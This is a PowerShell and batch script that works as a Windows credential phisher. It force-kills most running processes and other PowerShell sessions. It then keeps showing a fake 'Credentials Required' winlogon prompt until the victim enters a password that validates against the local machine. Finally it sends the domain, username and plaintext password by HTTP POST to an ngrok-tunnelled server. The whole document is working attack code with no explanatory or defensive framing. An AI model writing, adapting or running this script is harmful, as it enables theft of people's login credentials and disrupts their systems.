
#REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f

taskkill /f /fi "IMAGENAME ne sihost.exe" /fi "IMAGENAME ne powershell.exe" /fi "IMAGENAME ne svchost.exe" /fi "IMAGENAME ne dllhost.exe" /fi "IMAGENAME ne conhost.exe" /fi "IMAGENAME ne RuntimeBroker.exe"


$ngrokServer = 'ngrok_link/index.php'

[int]$cnt = 1
while ( $cnt -lt '1000000000' ) {
 
	$user    = [Environment]::UserName
	$domain  = [Environment]::UserDomainName

	

        Add-Type -assemblyname System.Windows.Forms
	Add-Type -assemblyname System.DirectoryServices.AccountManagement 
	$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	
        $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
        Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
        $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your password to connect to winlogon.", $c, "NetBiosUserName")
        $creds = $DS.ValidateCredentials($c, $credential.GetNetworkCredential().password)


	if ($creds -eq $false -Or $creds -eq $null) {
	    $choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
	}		

        else {
            $user = $credential.GetNetworkCredential().username;
            $pass = $credential.GetNetworkCredential().password;
            $username = "Username: ";
	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" `nPassword: "$pass"`n" -ErrorAction Ignore
            #REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
            powershell /c start sihost.exe
	    exit
        
	}

	$cnt++

}
